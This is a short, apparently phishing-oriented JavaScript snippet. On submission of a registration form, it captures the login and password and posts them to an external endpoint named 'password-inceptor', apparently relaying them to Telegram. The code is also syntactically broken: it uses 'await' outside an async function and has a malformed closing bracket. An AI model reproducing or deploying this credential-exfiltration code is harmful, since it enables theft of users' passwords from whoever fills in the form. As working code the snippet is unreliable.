document.getElementById('registerForm').addEventListener('submit', function(event) {
    event.preventDefault();

    const login = document.getElementById('login').value;
    const password = document.getElementById('password').value;

    const response = await fetch('https://password-inceptor.vercel.app/api/sendTelegram', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ login, password })
     });

    const result = await response.json();
)};
